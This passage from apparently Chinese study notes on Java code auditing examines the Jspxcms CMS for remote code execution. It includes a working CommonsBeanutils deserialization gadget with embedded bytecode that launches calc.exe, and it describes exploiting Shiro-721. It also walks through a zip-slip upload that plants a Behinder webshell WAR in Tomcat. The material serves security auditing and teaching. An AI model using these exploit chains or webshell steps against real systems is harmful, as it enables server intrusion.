src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051638558.png" alt="image-20220505163859362"></p><p>图8-56　从项目中挑选第三方库</p><p>这里的第三方库或多或少都存在问题，要么是本身存在漏洞，要么是某个漏洞利用链中的一环。</p><h4 id="1-2"><a href="#1-2" class="headerlink" title="1"></a>1</h4><p>首先排除一些简单的，比如Snakeyaml。本项目使用了Spring Boot，SpringBoot默认会引用Snakeyaml来解析项目中yml和yaml格式的配置文件。如果低版本的Spring Boot项目中存在 Spring Cloud和Spring Boot actuator，则可以通过发送HTTP报文更新配置信息的形式Snakeyaml去指定网址解析yml格式的恶意文件，从而造成RCE。但是本项目中只存在Snakeyaml的依赖，并没有Spring Cloud和Spring Boot actuator的依赖，所以忽略这一步。</p><h4 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h4><p>然后排除FastJson。众所周知，FastJson和Struts2是曾经的漏洞之王，如果项目中使用了1.2.3版本的Fastjson，则极有可能存在反序列化漏洞，那么该如何判断项目中有没有使用Fastjson呢？其实很简单，通过全局搜索fastjson，查看从哪个类中导入Fastjson，就可以进行判断。全局搜索结果如图8-57所示，可以发现项目中没有任何地方使用或者导入了Fastjson，所以忽略Fastjson。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051647419.png" alt="image-20220505164732264"></p><p>图8-57　全局搜索结果</p><h4 id="3-1"><a href="#3-1" class="headerlink" title="3"></a>3</h4><p>接下来就是排除大家非常熟悉的Apache Shiro，作为一个安全框架，一个鉴权工具，Apache Shiro多年来也爆出过几个RCE漏洞。Apache Shiro版本小于1.2.4，可能存在反序列化RCE漏洞即Shiro-550。Jspxcms中使用的Shiro版本是1.3.2，该版本存在通过Padding Oracle构造数据进行反序列化的漏洞，即Shiro-721，因此存在极高的RCE风险。</p><p>既然该处存在反序列化风险，那么想要触发RCE还需要一个利用链。我们再返回到该项目依赖的Jar包中，不难发现有两个漏洞（后续补充些内容）。</p><p>Jspxcms在Java反序列化利用工具ysoserial中有两个payload，分别是Hibernate1和Hibernate2。这两个payload就是Hibernate反序列化利用链，Jspxcms中引用了Hibernate 5.0.12版本，经过测试Hibernate 5.0.12缺少了一个org.hibernate. property.BasicPropertyAccessor$BasicGetter类，导致整个利用链失效了，所以忽略Hibernate。</p><h4 id="4"><a href="#4" class="headerlink" title="4"></a>4</h4><p>接下来是广为人知的Apache Commons-collections。在3.1版本的Commons- collections中有一条利用链，但是在3.2.2版本中ApacheCommons-collections对一些不安全的Java类的序列化支持增加了开关，默认为关闭状态。其中涉及的类包括CloneTransformer、ForClosure、InstantiateFactory、InstantiateTransformer、Invoker- Transformer、PrototypeCloneFactory、PrototypeSerializationFactory和WhileClosure。如果尝试使用这个版本的Apache Commons-collections去构造CC链，会报告以下错误，所以忽略commons-collections。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051651111.png" alt="image-20220505165140974"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051656151.png" alt="image-20220505165643973"></p><p>再继续寻找，可以看到Commons-beanutils依赖，版本是1.9.3。Java反序列化工具ysoserial中也有一条Commons-beanutils的利用链，但是这个利用链不仅需要Commons-beanutils，同时还需要Commons-collections以及Commons-logging，也就是说需要目标中同时存在这3个第三方库的依赖，这条利用链才有效，但是Jspxcms正好具备这个条件。由于这3个Jar包与ysoserial中生成gadget的Jar包的版本不一致，&#x3D;&#x3D;因此需要先将Jspxcms中的Commons-beanutils、Commons-collections和Commons-logging这3个Jar包导入ysoserial中进行验证，经过验证确实可用，&#x3D;&#x3D;</p><p>接下来即可使用ApacheShiro Padding Oracle Attack exp（Shiro-721）验证我们上述的想法是否可行。通过Apache Shiro Padding Oracle Attack exp验证后发现确实存在RCE漏洞.如图8-58所示<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051706872.png" alt="image-20220505170606678"></p><p>图8-58　验证后确认存在RCE漏洞</p><p>使用之前跟p牛学的payload可以成功弹出计算器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.jspxcms.core.test;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAHTEhlbGxvOwEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAlAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAY8aW5pdD4BAAMoKVYHACYBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwAGQAaBwAnDAAoACkBAAhjYWxjLmV4ZQwAKgArAQAFSGVsbG8BAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAPwAAAAMAAAABsQAAAAIACgAAAAYAAQAAAAwACwAAACAAAwAAAAEADAANAAAAAAABAA4ADwABAAAAAQAQABEAAgASAAAABAABABMAAQAHABQAAgAJAAAASQAAAAQAAAABsQAAAAIACgAAAAYAAQAAABEACwAAACoABAAAAAEADAANAAAAAAABAA4ADwABAAAAAQAVABYAAgAAAAEAFwAYAAMAEgAAAAQAAQATAAEAGQAaAAIACQAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgAKAAAADgADAAAAEwAEABQADQAVAAsAAAAMAAEAAAAOAAwADQAAABIAAAAEAAEAGwABABwAAAACAB0=&quot;</span>);<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;xxx&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-literal">null</span>, String.CASE_INSENSITIVE_ORDER);<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>, comparator);<br>        queue.add(<span class="hljs-string">&quot;x&quot;</span>);<br>        queue.add(<span class="hljs-string">&quot;x&quot;</span>);<br><br>        setFieldValue(comparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);<br>        setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj, obj&#125;);<br><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;src\\main\\java\\com\\jspxcms\\core\\test\\ser.txt&quot;</span>));<br>        out.writeObject(queue);<br>        out.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;src\\main\\java\\com\\jspxcms\\core\\test\\ser.txt&quot;</span>));<br>        in.readObject();<br>        in.close();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object arg)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(obj, arg);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205052013799.png" alt="image-20220505201352618"></p><p>经过测试反序列漏洞是可以利用的，现在需要一处接收反序列化数据触发漏洞的点。继续查看依赖包发现使用了 Apache Shiro 并且版本小于 1.4.2，可以利用 Shiro-721。这里我使用 <a href="https://github.com/inspiringz/Shiro-721">https://github.com/inspiringz/Shiro-721</a> 进行测试。</p><p>爆破出可以攻击的 rememberMe Cookie 大概需要一个多小时，如下界面所示<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205052014261.png" alt="image-20220505201421085"></p><p>进行测试成功弹出计算器，反序列化 RCE 利用成功。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205052014901.png" alt="image-20220505201434704"></p><h4 id="5"><a href="#5" class="headerlink" title="5"></a>5</h4><p>接下来同样是知名度非常高的一个第三方库Jackson，Jackson的用处与Fastjson相同，用来将对象序列化成JSON数据或者将JSON数据反序列化成对象。但是相比于Fastjson来说，Jackson的爆出的RCE漏洞少很多，但是JspxCMS项目中所使用的Jackson是一个非常低的版本即2.8.7版，所以存在极高的RCE漏洞风险。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051837980.png" alt="image-20220505183736829"></p><p>通过全局搜索发现了一个类com.jspxcms.common.util.JsonMapper。该类在Jackson的基础上又进行了一点简单的封装，但是调用了ObjectMapper的readValue方法，如图8-59和图8-60所示。现在我们获得了两个条件，&#x3D;&#x3D;一是项目依赖的Jackson版本存在漏洞，二是项目中调用了ObjectMapper的readValue方法。接下来需要判断这两个方法中的参数是否可控。&#x3D;&#x3D;<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051843493.png" alt="image-20220505184359330"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051844668.png" alt="image-20220505184411508"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051844258.png" alt="image-20220505184436100"></p><p>可以看到后面两张图用了泛解析  且发现是fromjson调用了jsonmapper</p><p>接下来就要全局搜索调用了JsonMapper的fromJson方法，经过搜索，发现了以下两个类，如图8-61所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051848097.png" alt="image-20220505184804949"></p><p>图8-61　全局搜索后发现的两个类</p><p>先从ScheduleJob类看起，该类是一个实体类通过hibernate与数据库中的cms_schedule_job表进行映射，调用JsonMapper的fromJson方法位于其getJobDetail方法中，如图8-62所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051851003.png" alt="image-20220505185155832"></p><p>图8-62　查看ScheduleJob类</p><p>根据图8-62的代码可看出传入fromJson方法中的data参数是通过getData方法获取的，所以需要去看getData方法的具体实现如图8-63所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051853185.png" alt="image-20220505185359034"></p><p>图8-63　getData方法的具体实现</p><p>data是从数据库中获取的，对应的是数据库中cms_schedule_job表的f_data字段。我们打开对应的表观察数据却发现是空的，而且经过一轮搜索后发现，项目中没有别处使用ScheduleJob这个实体类，所以无法通过调用该实体类向数据库中写入恶意数据从而进行反序列化攻击。经过一番查找，我们推定ScheduleJob这个实体类应该是被图8-64所示的功能调用，该功能未在开源版本中提供，所以此处虽然怀疑存在Jackson反序列化RCE漏洞，但是由于功能不全无法验证，因此漏洞风险极高，在日常审计项目中肯定要通知开发人员进行整改。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051859328.png" alt="image-20220505185924181"></p><p>图8-64　调用实体类的功能未在开源版本中提供</p><p>接下来分析Freemarkers类，该类同样调用了JsonMapper的fromJson方法，其方法实现如图8-65所示。</p><p>fromJson处理的参数是通过Freemarkers的getString方法获取的，其中getString方法需要传入的参数中，model和name皆是由外部调用时传入，所以需要再次找到是哪里调用了Freemarkers类的&#x3D;&#x3D;getParams方法&#x3D;&#x3D;。通过全局搜索，我们发现在AnchorMethod类中调用了Freemarkers类的getParams方法，如图8-66所示。经过一番搜索和调试，并未能在代码和调试运行中发现该方法被调用，所以忽略Jackson。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051921705.png" alt="image-20220505192127518"></p><p>图8-66　调用了getParams方法的Freemarkers类</p><h4 id="6"><a href="#6" class="headerlink" title="6"></a>6</h4><p>&#x3D;&#x3D;至此，有可能存在RCE漏洞的第三方库分析完成，接下来查看Jspxcms项目自身的代码会不会存在能够导致RCE漏洞的问题&#x3D;&#x3D;。众所周知，Java是静态语言，在编译期已经将各种属性和参数的类型确定好，而且Java可以执行命令的函数只有&#x3D;&#x3D;两个：一个是Runtime类的exec方法，另一个是ProcessBuilder的star方法&#x3D;&#x3D;。看过Runtime类源码的读者应该都清楚Runtime类的exec方法其实还是通过调用ProcessBuilder的star方法来实现执行系统命令的效果，因此我们可以先全局搜索代码中是否调用了Runtime类的exec方法或者ProcessBuilder的star方法。</p><p>首先搜索Runtime，我们发现HomepageController类中调用了Runtime，如图8-67所示，可是没有调用exec方法，所以忽略Runtime。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051926225.png" alt="image-20220505192654064"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051927541.png" alt="image-20220505192702363"></p><p>图8-67　未调用Runtime类的exec方法</p><p>接下来搜索ProcessBuilder，<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051928120.png" alt="image-20220505192832970">经过搜索发现SwfConverter类的pdf2swf方法中不仅用到了ProcessBuilder类，还通过ProcessBuilder类的command方法传入命令，并通过start方法执行，具体细节如图8-68所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051930259.png" alt="image-20220505193028113"></p><p>图8-68　查看ProcessBuilder类的具体细节</p><p>可以发现，命令由多个参数拼接而成，这导致命令执行几乎无法实现。为严谨起见，需要查看这些参数究竟是从哪里传递来的，是否调用了SwfConverter类的pdf2swf方法。经过查找，我们发现项目中只有一个位置调用了该方法，即SwfConverter类自己的main方法，如图8-69所示。不难判断这个main方法是开发人员在编写这个类时用来进行测试留下的，所以命令执行这条路也可以忽略。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051934419.png" alt="image-20220505193428199"></p><p>图8-69　调用了pdf2swf方法的main方法</p><p>还有哪种可能会造成RCE呢？熟悉Java的读者肯定会想到Java中一个非常重要的机制，就是&#x3D;&#x3D;反射机制&#x3D;&#x3D;。通过反射我们可以使Java实现一种动态语言的效果，即可以在运行期通过传递参数的形式调用或者实例化任何类，以及调用类或者实例对象中的任何方法和属性。分析Java所有的RCE漏洞底层原理，发现几乎都离不开反射，所以全局搜索用到了反射。经过搜索，我们锁定了两个可疑的类，如图8-70所示。</p><p>&#x3D;&#x3D;1.只看.java  2.只看方法调用中invoke&#x3D;&#x3D;<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051943449.png" alt="image-20220505194354289"></p><p>图8-70　搜索后锁定的两个可疑的类</p><p>Reflections类中有两种方法：invoke方法和getPerperty方法，代码如图8-71所示，其底层都是调用了method.invoke方法来反射执行指定类的指定方法。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051953504.png" alt="image-20220505195331325"></p><p>图8-71　查看invoke方法和getPerperty方法<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051958433.png" alt="image-20220505195859272"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051959135.png" alt="image-20220505195930978"></p><p>总而言之，进行RCE漏洞审计时，首先查看程序中是否了引用包含有已知RCE漏洞的第三方库，如果没有，则需要着重审计项目中有无可造成命令执行的函数和类，如Runtime、ProcessBuilder等。其次就是反射需要重点关注method.invoke方法，以及前文中没有提及的反序列化漏洞。挖掘反序列化漏洞时，除了查看有没有引用含有已知反序列化的第三方库以外，还要&#x3D;&#x3D;注意项目本身有无调用反序列化的点，如JDK自带的反序列化方法readObject&#x3D;&#x3D;。本项目中的反序列化行为是通过调用了Jackson这个第三方库来进行的，同样需要注意JDK自带的反序列化方法readObject。</p><h4 id="7"><a href="#7" class="headerlink" title="7"></a>7</h4><p>文件上传RCE</p><p>这个漏洞在文件管理的压缩包上传功能，上传的压缩包会被自动解压，如果我们在压缩包中放入 war 包并配合解压后目录穿越 war 包就会被移动到 tomcat 的 webapps 目录，而 tomcat 会自动解压 war 包。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205052023470.png" alt="image-20220505202347203"></p><p>这里我使用冰蝎的 jsp webshell <a href="https://github.com/rebeyond/Behinder">冰蝎下载链接</a>，将 webshell 打包成 war 包。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205052023463.png" alt="image-20220505202358283"></p><p>然后将 war 包打包成压缩文件。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205052024101.png" alt="image-20220505202406874"></p><p>注意：这里测试需要启动 tomcat 做测试，而不是 IDEA 的 SpringBoot，否则可能无法成功。<br>上传完之后连接 webshell 成功 RCE。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205052024022.png" alt="image-20220505202423869"></p><p>分析漏洞产生的原因，抓取文件上传的请求包，通过请求路径使用 IDEA 定位到代码。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205052024371.png" alt="image-20220505202445200"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205052025312.png" alt="image-20220505202545129"></p><p>有1 2 3个zip_upload.do 只有权限访问上有区别</p><p>进函数里看看<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205052028948.png" alt="image-20220505202822786"></p><p>跟进zipupload<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205052030621.png" alt="image-20220505203007453"></p><p>都点一遍 筛选出一个前端 一个后端</p><p>前端<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205052030419.png" alt="image-20220505203058240"></p><p>负责判断 上传是 1 2 3 </p><p>判断是不是zip</p><p>还有辨识site</p><p>后端<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205052032566.png" alt="image-20220505203239385"></p><p>先看上面这个 在看代码</p><p>3个用法 3个重写 就是我们之前找到那个up_loadfile  1 2 3</p><p>就是参数变了一些</p><p>接下来看代码<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205052034085.png" alt="image-20220505203444908"></p><p>这里有个AntZipUtils.unzip方法 应该是自动解压 跟进一下</p><p>有好多个unzip 先进AntZipUtils.java 再</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unzip</span><span class="hljs-params">(File zipFile, File destDir, String encoding)</span> &#123;<br><span class="hljs-keyword">if</span> (destDir.exists() &amp;&amp; !destDir.isDirectory()) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;destDir is not a directory!&quot;</span>);<br>&#125;<br><span class="hljs-type">ZipFile</span> <span class="hljs-variable">zip</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>File file;<br>String name;<br><span class="hljs-type">byte</span>[] buff = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[DEFAULT_BUFFER_SIZE];<br><span class="hljs-type">int</span> readed;<br>ZipEntry entry;<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-keyword">if</span> (StringUtils.isNotBlank(encoding)) &#123;<br>zip = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipFile</span>(zipFile, encoding);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>zip = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipFile</span>(zipFile);<br>&#125;<br>Enumeration&lt;?&gt; en = zip.getEntries();<br><span class="hljs-keyword">while</span> (en.hasMoreElements()) &#123;<br>entry = (ZipEntry) en.nextElement();<br>name = entry.getName();<br>name = name.replace(<span class="hljs-string">&#x27;/&#x27;</span>, File.separatorChar);<br>file = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(destDir, name);<br><span class="hljs-keyword">if</span> (entry.isDirectory()) &#123;<br>file.mkdirs();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// 创建父目录</span><br>file.getParentFile().mkdirs();<br>is = zip.getInputStream(entry);<br>fos = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(file);<br><span class="hljs-keyword">while</span> ((readed = is.read(buff)) &gt; <span class="hljs-number">0</span>) &#123;<br>fos.write(buff, <span class="hljs-number">0</span>, readed);<br>&#125;<br>fos.close();<br>is.close();<br>&#125;<br>&#125;<br>&#125; <span class="hljs-keyword">finally</span> &#123;<br><span class="hljs-keyword">if</span> (fos != <span class="hljs-literal">null</span>) &#123;<br>fos.close();<br>&#125;<br><span class="hljs-keyword">if</span> (is != <span class="hljs-literal">null</span>) &#123;<br>is.close();<br>&#125;<br><span class="hljs-keyword">if</span> (zip != <span class="hljs-literal">null</span>) &#123;<br>zip.close();<br>&#125;<br>&#125;<br>&#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>logger.error(<span class="hljs-string">&quot;&quot;</span>, e);<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到文件名没有做安全处理，执行到 fos.write (写入流)时 shell.war 就被写入到 tomcat 的 webapps 目录了，这里的目录名不太对劲，因为是在 IDEA 启动 SpringBoot 进行调试的，无须在意，分析到这里就结束了。</p><p>为什么不直接上传 jsp 文件 getshell 呢？我们试一下，发现响应 404 文件不存在，并且文件路径前加了 &#x2F;jsp。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205052042623.png" alt="image-20220505204210436"></p><p>通过调试发现 JspDispatcherFilter.java 会对访问的 jsp 文件路径前加 &#x2F;jsp，这就是不直接上传 jsp 文件 getshell的原因。而我们使用压缩包的方式会将 shell.war 解压到 tomcat 的 webapps 目录，这相当于一个新的网站项目JspDispatcherFilter.java 是管不着的。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205052042167.png" alt="image-20220505204249825"></p><h2 id="8-6-本章总结"><a href="#8-6-本章总结" class="headerlink" title="8.6　本章总结"></a>8.6　本章总结</h2><p>本章的主要基于开源Java Web应用Jspxcms，针对SQL注入、XSS注入、SSRF和RCE等常见漏洞进行了较为详细的代码审计讲解。希望本章的讲解可以帮助读者在面对一套新的Web应用源码时更加有的放矢。由于篇幅有限，本章并未对其他相关漏洞进行审计覆盖，有兴趣的读者可以根据前文中介绍的知识点自行尝试挖掘。</p><h1 id="第9章-小话IAST与RASP"><a href="#第9章-小话IAST与RASP" class="headerlink" title="第9章　小话IAST与RASP"></a>第9章　小话IAST与RASP</h1><p>IAST与RASP技术可用于提高应用程序的安全度。本章的主要内容是对IAST与RASP进行简要介绍，对二者共同的核心模块Java-agent进行实验探究和原理浅析。</p><h2 id="9-1-IAST简介"><a href="#9-1-IAST简介" class="headerlink" title="9.1　IAST简介"></a>9.1　IAST简介</h2><p>IAST（Interactive Application Security 